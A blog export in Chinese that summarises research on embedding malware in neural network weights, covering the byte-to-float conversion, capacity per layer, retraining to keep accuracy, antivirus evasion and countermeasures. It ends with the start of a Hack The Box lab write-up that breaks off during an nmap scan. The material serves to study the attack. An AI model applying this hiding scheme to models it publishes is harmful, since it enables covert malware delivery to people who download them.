<p>攻击者应定义一组规则，将恶意软件嵌入到神经网络模型中，以便接收方能够正确提取恶意软件。我们建议快速替换来嵌入恶意软件。在实验中，对于嵌入的恶意软件，我们每次读取3个字节，根据参数在第一个字节中添加前缀“\x3c”或“\xbc”，然后将字节转换为有效的大端浮点数。如果剩余样本少于3个字节，我们将添加填充“\x00”以填充3个字节。在嵌入模型之前，这些数字被转换成张量。然后，给定一个神经网络模型和一个指定的层，我们通过替换每个神经元中的权重和偏差来依次修改神经元。我们使用每个神经元中的连接权重来存储转换后的恶意软件字节，并使用偏差来存储恶意软件的长度和哈希。提取过程与嵌入过程相反。接收器需要提取给定层中神经元的参数，将参数转换为浮点数，将数字转换为大端格式的字节，并删除字节的前缀以获得二进制字节流。然后，根据第一个神经元的偏差记录的长度，接收器可以组装恶意软件。接收器可以通过比较提取的恶意软件的哈希值与bias中记录的哈希值来验证提取过程。</p>
<p>IV. EXPERIMENTS SETUP</p>
<p>在本节中，我们准备了实验过程，包括模型和恶意软件样本。实验分为两部分:</p>
<ul>
<li>第一部分研究自训练神经网络模型的嵌入能力</li>
<li>第二部分是该方法在公共预训练模型中的应用。</li>
</ul>
<p><strong>A. Neural Network Models</strong></p>
<p><strong>1.自我训练模型</strong></p>
<p>我们在Fashion MNIST[16]上建立并训练了一个AlexNet模型，以证明该方法的可行性。AlexNet是一个8层卷积神经网络，包括五个卷积层、两个完全连接的隐藏层和一个完全连接的输出层。我们调整了网络结构以适应数据集。AlexNet的输入为224x224单通道灰度图像，输出是一个长度为10的向量，代表10个类。图像在被送入网络之前被调整为224x224。由于我们打算交付大型恶意软件，并且完全连接的层有更多的神经元，我们将在实验中更多地关注完全连接的层。我们将完全连接的层分别命名为FC.0，FC.1和FC.2。FC.0是第一个完全连接的隐藏层，有4096个神经元。它从卷积层接收6400个输入，并生成4096个输出。因此，每个神经元的FC.0层有6400个连接权重，这意味着6400×3/1024=18.75KB的恶意软件可以嵌入FC.0层神经元。FC.1是第二个完全连接的隐藏层，有4096个神经元。它接收4096个输入，并生成4096个输出。因此，4096×3/1024=12KB的恶意软件可以嵌入FC.1单层神经元。FC.2是输出层，我们保持不变，主要关注FC.0和FC.1。FC.2接收4096个输入，并生成10个输出。</p>
<p>批处理归一化 (BN) 是加速深度网络收敛的有效技术。由于BN层可以在完全连接的层中的仿射变换和激活函数之间应用，因此我们比较了在完全连接的层上具有和不具有BN的模型的性能。经过大约100个时期的训练，我们分别在没有BN的测试集上获得了精度93.44% 的模型，以及在BN的情况下获得了精度93.75% 的模型。每个型号的尺寸为178mb。模型已保存以备后用。</p>
<p><strong>2.公共模型</strong></p>
<p>我们在来自PyTorch公共存储库的ImageNet上使用了10个预训练的主流模型来证明这种方法的普遍性。该模型接受大小为 224x224 的三通道图像，并生成长度为1000的向量。图像首先调整为256x256，然后随机裁剪为224x244大小。嵌入前ImageNet上的模型和初始精度如表 I 所示。攻击者可以使用现有模型来减少工作量，并将嵌入恶意软件的模型发布到公共存储库和 DNN 市场上。</p>
<p><strong>B. Malware Samples</strong></p>
<p>为了模拟真实场景，我们在来自 InQuest和Malware DB的高级恶意软件活动中使用了真实的恶意软件样本。恶意软件样本有不同的大小和类型。 我们使用 InQuest的样本进行容量研究，使用 Malware DB的样本进行普遍性测试。 实验中显示了有关这两部分中使用的恶意软件样本的详细信息。</p>
<h2 id="EVALUATION"><a href="#EVALUATION" class="headerlink" title="EVALUATION"></a>EVALUATION</h2><p>在本节中，我们将介绍有关嵌入能力的实验以及在公共预训练模型上的应用。关于快速替换有一些主要关心的问题:</p>
<p> i) 该方法有效吗？如果可行</p>
<p>ii) 模型中可以嵌入多少恶意软件？</p>
<p>iii) 模型上的性能下降是什么？</p>
<p>iv) BN有帮助吗？</p>
<p>v) 哪一层更适合嵌入？</p>
<p>vi) 如何通过再培训恢复准确性？效果如何？</p>
<p>vii) 嵌入恶意软件的模型能否通过防病毒引擎的安全扫描？</p>
<p>在下面的实验中，我们将回答上述问题。</p>
<p><strong>A. Malware embedding</strong></p>
<ol>
<li>对于Q-I: </li>
</ol>
<p>FC.1是最接近输出层的隐藏层。如上所述，FC.1层中的每个神经元都可以嵌入12KB的恶意软件。我们使用恶意软件样本1-6分别替换层中的神经元，并评估测试集的性能。测试精度范围从93.43% 到93.45%。(我们注意到，在某些情况下，准确性略有提高。)然后我们从模型中提取恶意软件并计算其SHA-1哈希。哈希保持不变。它表明该方法有效。</p>
<ol start="2">
<li>对于Q-II至Q-IV: </li>
</ol>
<p>对于问题II和III，我们使用样本1-6替换了FC.1层中的5,10,….4095神经元。在具有和不具有BN的AlexNet上的FC.0中，并记录了被替换模型的准确性。FC.0中的每个神经元可以嵌入18.75kb的恶意软件。由于一个样本最多可以替换FC.0和FC.1层中的5个神经元，因此我们用同一样本重复替换该层中的神经元，直到替换的神经元数量达到目标。最后，我们得到了6组精度数据，并分别计算了它们的平均值。</p>
<p>可以发现，当替换较少数量的神经元时，模型的准确性几乎没有影响。对于带有BN的AlexNet，在FC.1中替换1025神经元 (25%) 时，准确性仍然可以达到93.63%，相当于嵌入了12MB的恶意软件。当替换2050神经元 (50%) 时，准确度是93.11% 的。当超过2105个神经元被替换时，准确度下降到93% 以下。当超过2900个神经元被替换时，准确度下降到90% 以下。此时，随着替换神经元的增加，准确性显着降低。当替换超过3290个神经元时，准确度下降到80% 以下。当所有神经元被替换时，准确度下降到10% 左右 (相当于随机猜测)。对于FC.0，当分别替换超过220、1060、1550神经元时，准确度下降到低于93% 、90% 、80%。</p>
<p>结果可以回答问题II至IV。如果攻击者希望将模型的性能保持在1%的准确性损失内并嵌入更多的恶意软件，则在AlexNet上替换不超过2285个神经元，BN可以嵌入2285×12/1024=26.8mb的恶意软件。</p>
<ol start="3">
<li>对于Q-V: </li>
</ol>
<p>为了回答问题V，我们选择将恶意软件嵌入AlexNet的所有层。卷积层的参数比完全连接的层少得多。因此，不建议在卷积层中嵌入恶意软件。但是，为了选择最佳图层，我们仍然与所有图层进行了比较。我们使用样品替换每层中不同比例的神经元，并记录准确性。由于不同的层具有不同的参数，因此我们使用百分比来指示替换的数量。对于具有和不具有BN的AlexNet，FC.1在所有层中都具有出色的性能。可以推断，对于完全连接的层，更靠近输出层的层更适合嵌入。</p>
<p><strong>B. Retraining</strong></p>
<p>如果测试准确率大幅下降，攻击者可以重新训练模型以恢复性能。 基于CNN的模型使用反向传播来更新每个神经元中的参数。当一些神经元不需要更新时，可以将它们“冻结”（通过在 PyTorch中将“requires grad”属性设置为“false”），这样在反向传播的过程中会忽略里面的这些参数，从而保证嵌入式恶意软件保持不变。</p>
<p>我们选择了性能与平均精度相似的样本，并在有和没有BN的模型中替换了FC.0和FC.1层中的 50、100、…、4050 个神经元。然后我们“冻结”恶意软件嵌入层并使用训练集重新训练模型一个时期。记录在培训前后的测试准确性。在对每个模型进行重新训练后，我们提取模型中嵌入的恶意软件并计算组装恶意软件的SHA-1哈希值，它们都与原始哈希值匹配。</p>
<p>具有BN模型，并在FC.0层进行的准确率会提高。</p>
<p>如果攻击者使用带有BN和重新训练的模型将恶意软件嵌入到FC.1上，并且希望将准确性损失保持在模型的1% 范围内，则可以替换3150多个神经元。它将导致3150 × 12/1024 = 36.9mb的恶意软件嵌入。如果攻击者希望将准确度保持在90% 以上，则可以替换3300神经元，嵌入38.7mb的恶意软件。</p>
<h2 id="POSSIBLE-COUNTERMEASURES"><a href="#POSSIBLE-COUNTERMEASURES" class="headerlink" title="POSSIBLE COUNTERMEASURES"></a>POSSIBLE COUNTERMEASURES</h2><p>尽管恶意软件可以嵌入到DNN模型中，但仍有办法抵御此类攻击。首先恶意软件嵌入模型无法修改。对于专业人士来说，神经元的参数可以通过微调、修剪、模型压缩或其他操作来改变，从而打破恶意软件的结构，防止恶意软件正常恢复。然而，非专业用户仍可能面临此类攻击。其次，恶意软件嵌入模型的交付需要供应链污染等方法。如果用户从可信平台下载所需的模型并检查模型的完整性，影响也可以降低。最后，DNN模型市场还需要验证用户身份，以避免被恶意用户滥用。</p>
<h2 id="CONCLUSION"><a href="#CONCLUSION" class="headerlink" title="CONCLUSION"></a>CONCLUSION</h2><p>本文提出了一种方法，可以通过神经网络模型隐蔽地、回避地传递恶意软件。当神经元被恶意软件字节替换时，模型的结构保持不变。由于恶意软件在神经元中被拆解，其特征不再可用，可以逃避常见反病毒引擎的检测。由于神经网络模型对变化具有鲁棒性，因此性能没有显着损失。实验表明，通过在全连接层上应用批归一化，一个 178MB-AlexNet模型可以在 1% 的准确率损失内嵌入 36.9MB 的恶意软件。 VirusTotal 的安全扫描也证明了嵌入恶意软件的模型可以逃避检测。 这篇论文证明了神经网络也可以被恶意使用。 随着人工智能的普及，人工智能辅助攻击将不断涌现，给计算机安全带来新的挑战。 网络攻防是相互依存的。 我们相信未来将应用针对人工智能辅助攻击的对策。 我们希望提议的方案将有助于未来的保护工作。</p>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>这种隐藏手段可以有效隐藏恶意软件，但当恶意软件执行时，还是需要考虑行为模式检测，需要进一步思考恶意软件的行为检测模式绕过。</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-OpenSource</title>
    <url>/2022/10/07/htb-opensource/</url>
    <content><![CDATA[<h1 id="HTB-OpenSource"><a href="#HTB-OpenSource" class="headerlink" title="HTB-OpenSource"></a>HTB-OpenSource</h1><p>IP: 10.10.11.164</p>
<p>fscan, kscan扫描，开放80和22端口</p>
<p><img src="/2022/10/07/htb-opensource/%25E6%2588%25AA%25E5%25B1%258F2022-09-03_18.34.13.png" alt="截屏2022-09-03 18.34.13.png"></p>
<p>nmap -sC -sV -p- -oA openssource 10.10.11.164</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Starting Nmap <span class="token number">7.92</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2022</span>-09-03 07:01 EDT
Stats: <span class="token number">0</span>:13:49 elapsed<span class="token punctuation">;</span> <span class="token number">0</span> hosts completed <span class="token punctuation">(</span><span class="token number">1</span> up<span class="token punctuation">)</span>, <span class="token number">1</span> undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About <span class="token number">55.77</span>% <span class="token keyword">done</span><span class="token punctuation">;</span> ETC: 07:26 <span class="token punctuation">(</span><span class="token number">0</span>:10:57 remaining<span class="token punctuation">)</span>
RTTVAR has grown to over <span class="token number">2.3</span> seconds, decreasing to <span class="token number">2.0</span>
RTTVAR has grown to over <span class="token number">2.3</span> seconds, decreasing to <span class="token number">2.0</span>
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.11.164
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.71s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65532</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT     STATE    SERVICE VERSION
<span class="token number">22</span>/tcp   <span class="token function">open</span>     <span class="token function">ssh</span>     OpenSSH <span class="token number">7</span>.6p1 Ubuntu 4ubuntu0.7 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">2048</span> 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> <span class="token number">48</span>:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp   <span class="token function">open</span>     http    Werkzeug/2.1.2 Python/3.10.3
<span class="token operator">|</span> fingerprint-strings: 
<span class="token operator">|</span>   GetRequest: 
<span class="token operator">|</span>     HTTP/1.1 <span class="token number">200</span> OK
<span class="token operator">|</span>     Server: Werkzeug/2.1.2 Python/3.10.3
<span class="token operator">|</span>     Date: Sat, 03 Sep <span class="token number">2022</span> <span class="token number">11</span>:42:16 GMT
<span class="token operator">|</span>     Content-Type: text/html<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8
<span class="token operator">|</span>     Content-Length: <span class="token number">5316</span>
<span class="token operator">|</span>     Connection: close
<span class="token operator">|</span>     <span class="token operator">&lt;</span>html <span class="token assign-left variable">lang</span><span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>head<span class="token operator">&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>meta <span class="token assign-left variable">charset</span><span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>meta <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"viewport"</span> <span class="token assign-left variable">content</span><span class="token operator">=</span><span class="token string">"width=device-width, initial-scale=1.0"</span><span class="token operator">&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>title<span class="token operator">&gt;</span>upcloud - Upload files <span class="token keyword">for</span> Free<span class="token operator">!</span><span class="token operator">&lt;</span>/title<span class="token operator">&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>script <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">"/static/vendor/jquery/jquery-3.4.1.min.js"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>/script<span class="token operator">&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>script <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">"/static/vendor/popper/popper.min.js"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>/script<span class="token operator">&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>script <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">"/static/vendor/bootstrap/js/bootstrap.min.js"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>/script<span class="token operator">&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>script <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">"/static/js/ie10-viewport-bug-workaround.js"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>/script<span class="token operator">&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">"stylesheet"</span> <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"/static/vendor/bootstrap/css/bootstrap.css"</span>/<span class="token operator">&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">"stylesheet"</span> <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">" /static/vendor/bootstrap/css/bootstrap-grid.css"</span>/<span class="token operator">&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span><span class="token string">"stylesheet"</span> <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">" /static/vendor/bootstrap/css/bootstrap-reboot.css"</span>/<span class="token operator">&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>link <span class="token assign-left variable">rel</span><span class="token operator">=</span>
<span class="token operator">|</span>   HTTPOptions: 
<span class="token operator">|</span>     HTTP/1.1 <span class="token number">200</span> OK
<span class="token operator">|</span>     Server: Werkzeug/2.1.2 Python/3.10.3
<span class="token operator">|</span>     Date: Sat, 03 Sep <span class="token number">2022</span> <span class="token number">11</span>:42:18 GMT
<span class="token operator">|</span>     Content-Type: text/html<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8
<span class="token operator">|</span>     Allow: OPTIONS, GET, HEAD
<span class="token operator">|</span>     Content-Length: <span class="token number">0</span>
<span class="token operator">|</span>     Connection: close
<span class="token operator">|</span>   RTSPRequest: 
<span class="token operator">|</span>     <span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE HTML PUBLIC <span class="token string">"-//W3C//DTD HTML 4.01//EN"</span>
<span class="token operator">|</span>     <span class="token string">"http://www.w3.org/TR/html4/strict.dtd"</span><span class="token operator">&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>head<span class="token operator">&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>meta http-equiv<span class="token operator">=</span><span class="token string">"Content-Type"</span> <span class="token assign-left variable">content</span><span class="token operator">=</span><span class="token string">"text/html;charset=utf-8"</span><span class="token operator">&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>title<span class="token operator">&gt;</span>Error response<span class="token operator">&lt;</span>/title<span class="token operator">&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>/head<span class="token operator">&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>h<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>Error response<span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>Error code: <span class="token number">40</span><span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/p<span class="token operator">&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>Message: Bad request version <span class="token punctuation">(</span><span class="token string">'RTSP/1.0'</span><span class="token punctuation">)</span>.<span class="token operator">&lt;</span>/p<span class="token operator">&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.<span class="token operator">&lt;</span>/p<span class="token operator">&gt;</span>
<span class="token operator">|</span>     <span class="token operator">&lt;</span>/body<span class="token operator">&gt;</span>
<span class="token operator">|</span>_    <span class="token operator">&lt;</span>/html<span class="token operator">&gt;</span>
<span class="token operator">|</span>_http-title: upcloud - Upload files <span class="token keyword">for</span> Free<span class="token operator">!</span>
<span class="token operator">|</span>_http-server-header: Werkzeug/2.1.2 Python/3.10.3
<span class="token number">3000</span>/tcp filtered ppp
<span class="token number">1</span> <span class="token function">service</span> unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service <span class="token builtin class-name">:</span>
SF-Port80-TCP:V<span class="token operator">=</span><span class="token number">7.92</span>%I<span class="token operator">=</span><span class="token number">7</span>%D<span class="token operator">=</span><span class="token number">9</span>/3%Time<span class="token operator">=</span>63133D98%P<span class="token operator">=</span>x86_64-pc-linux-gnu%r<span class="token punctuation">(</span>GetRe
SF:quest,1573,<span class="token string">"HTTP/1\.1<span class="token entity" title="\x20">\x20</span>200<span class="token entity" title="\x20">\x20</span>OK<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Server:<span class="token entity" title="\x20">\x20</span>Werkzeug/2\.1\.2<span class="token entity" title="\x20">\x20</span>Py
SF:thon/3\.10\.3<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Date:<span class="token entity" title="\x20">\x20</span>Sat,<span class="token entity" title="\x20">\x20</span>03<span class="token entity" title="\x20">\x20</span>Sep<span class="token entity" title="\x20">\x20</span>2022<span class="token entity" title="\x20">\x20</span>11:42:16<span class="token entity" title="\x20">\x20</span>GMT\
SF:r<span class="token entity" title="\n">\n</span>Content-Type:<span class="token entity" title="\x20">\x20</span>text/html;<span class="token entity" title="\x20">\x20</span>charset=utf-8<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Content-Length:<span class="token entity" title="\x20">\x20</span>5
SF:316<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Connection:<span class="token entity" title="\x20">\x20</span>close<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>&lt;html<span class="token entity" title="\x20">\x20</span>lang=<span class="token entity" title="\&quot;">\"</span>en<span class="token entity" title="\&quot;">\"</span>&gt;<span class="token entity" title="\n">\n</span>&lt;head&gt;<span class="token entity" title="\n">\n</span><span class="token entity" title="\x20">\x20</span>\
SF:x20<span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span>&lt;meta<span class="token entity" title="\x20">\x20</span>charset=<span class="token entity" title="\&quot;">\"</span>UTF-8<span class="token entity" title="\&quot;">\"</span>&gt;<span class="token entity" title="\n">\n</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x20">\x20</span>&lt;meta<span class="token entity" title="\x20">\x20</span>name=\
SF:"</span>viewport<span class="token punctuation">\</span>"<span class="token punctuation">\</span>x20content<span class="token operator">=</span><span class="token punctuation">\</span>"width<span class="token operator">=</span>device-width,<span class="token punctuation">\</span>x20initial-scale<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">\</span>.0<span class="token punctuation">\</span>"<span class="token operator">&gt;</span><span class="token punctuation">\</span>n
SF:<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>title<span class="token operator">&gt;</span>upcloud<span class="token punctuation">\</span>x20-<span class="token punctuation">\</span>x20Upload<span class="token punctuation">\</span>x20files<span class="token punctuation">\</span>x20for<span class="token punctuation">\</span>x20Free<span class="token operator">!</span><span class="token operator">&lt;</span>
SF:/title<span class="token operator">&gt;</span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>n<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>script<span class="token punctuation">\</span>x20src<span class="token operator">=</span><span class="token punctuation">\</span>"/static/vendor/jquery/jquer
SF:y-3<span class="token punctuation">\</span>.4<span class="token punctuation">\</span>.1<span class="token punctuation">\</span>.min<span class="token punctuation">\</span>.js<span class="token punctuation">\</span>"<span class="token operator">&gt;</span><span class="token operator">&lt;</span>/script<span class="token operator">&gt;</span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>script<span class="token punctuation">\</span>x20src<span class="token operator">=</span><span class="token punctuation">\</span>"/stati
SF:c/vendor/popper/popper<span class="token punctuation">\</span>.min<span class="token punctuation">\</span>.js<span class="token punctuation">\</span>"<span class="token operator">&gt;</span><span class="token operator">&lt;</span>/script<span class="token operator">&gt;</span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>n<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>script<span class="token punctuation">\</span>
SF:x20src<span class="token operator">=</span><span class="token punctuation">\</span>"/static/vendor/bootstrap/js/bootstrap<span class="token punctuation">\</span>.min<span class="token punctuation">\</span>.js<span class="token punctuation">\</span>"<span class="token operator">&gt;</span><span class="token operator">&lt;</span>/script<span class="token operator">&gt;</span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>x
SF:20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>script<span class="token punctuation">\</span>x20src<span class="token operator">=</span><span class="token punctuation">\</span>"/static/js/ie10-viewport-bug-workaround<span class="token punctuation">\</span>
SF:.js<span class="token punctuation">\</span>"<span class="token operator">&gt;</span><span class="token operator">&lt;</span>/script<span class="token operator">&gt;</span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>n<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>link<span class="token punctuation">\</span>x20rel<span class="token operator">=</span><span class="token punctuation">\</span>"stylesheet<span class="token punctuation">\</span>"<span class="token punctuation">\</span>x20href<span class="token operator">=</span>
SF:<span class="token punctuation">\</span>"/static/vendor/bootstrap/css/bootstrap<span class="token punctuation">\</span>.css<span class="token punctuation">\</span>"/<span class="token operator">&gt;</span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>lin
SF:k<span class="token punctuation">\</span>x20rel<span class="token operator">=</span><span class="token punctuation">\</span>"stylesheet<span class="token punctuation">\</span>"<span class="token punctuation">\</span>x20href<span class="token operator">=</span><span class="token punctuation">\</span>"<span class="token punctuation">\</span>x20/static/vendor/bootstrap/css/boot
SF:strap-grid<span class="token punctuation">\</span>.css<span class="token punctuation">\</span>"/<span class="token operator">&gt;</span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>link<span class="token punctuation">\</span>x20rel<span class="token operator">=</span><span class="token punctuation">\</span>"stylesheet<span class="token punctuation">\</span>"<span class="token punctuation">\</span>x20hre
SF:f<span class="token operator">=</span><span class="token punctuation">\</span>"<span class="token punctuation">\</span>x20/static/vendor/bootstrap/css/bootstrap-reboot<span class="token punctuation">\</span>.css<span class="token punctuation">\</span>"/<span class="token operator">&gt;</span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>n<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>
SF:x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>link<span class="token punctuation">\</span>x20rel<span class="token operator">=</span><span class="token string">")%r(HTTPOptions,C7,"</span>HTTP/1<span class="token punctuation">\</span>.1<span class="token punctuation">\</span>x20200<span class="token punctuation">\</span>x20OK<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n
SF:Server:<span class="token punctuation">\</span>x20Werkzeug/2<span class="token punctuation">\</span>.1<span class="token punctuation">\</span>.2<span class="token punctuation">\</span>x20Python/3<span class="token punctuation">\</span>.10<span class="token punctuation">\</span>.3<span class="token punctuation">\</span>r<span class="token punctuation">\</span>nDate:<span class="token punctuation">\</span>x20Sat,<span class="token punctuation">\</span>x2003<span class="token punctuation">\</span>x
SF:20Sep<span class="token punctuation">\</span>x202022<span class="token punctuation">\</span>x2011:42:18<span class="token punctuation">\</span>x20GMT<span class="token punctuation">\</span>r<span class="token punctuation">\</span>nContent-Type:<span class="token punctuation">\</span>x20text/html<span class="token punctuation">;</span><span class="token punctuation">\</span>x20char
SF:set<span class="token operator">=</span>utf-8<span class="token punctuation">\</span>r<span class="token punctuation">\</span>nAllow:<span class="token punctuation">\</span>x20OPTIONS,<span class="token punctuation">\</span>x20GET,<span class="token punctuation">\</span>x20HEAD<span class="token punctuation">\</span>r<span class="token punctuation">\</span>nContent-Length:<span class="token punctuation">\</span>x200
SF:<span class="token punctuation">\</span>r<span class="token punctuation">\</span>nConnection:<span class="token punctuation">\</span>x20close<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token punctuation">\</span>r<span class="token punctuation">\</span>n<span class="token string">")%r(RTSPRequest,1F4,"</span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE<span class="token punctuation">\</span>x20HTML
SF:<span class="token punctuation">\</span>x20PUBLIC<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>"-//W3C//DTD<span class="token punctuation">\</span>x20HTML<span class="token punctuation">\</span>x204<span class="token punctuation">\</span>.01//EN<span class="token punctuation">\</span>"<span class="token punctuation">\</span>n<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x2
SF:0<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>"http://www<span class="token punctuation">\</span>.w3<span class="token punctuation">\</span>.org/TR/html4/strict<span class="token punctuation">\</span>.dtd<span class="token punctuation">\</span>"<span class="token operator">&gt;</span><span class="token punctuation">\</span>n<span class="token operator">&lt;</span>html<span class="token operator">&gt;</span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>x2
SF:0<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>head<span class="token operator">&gt;</span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>meta<span class="token punctuation">\</span>x20http-equi
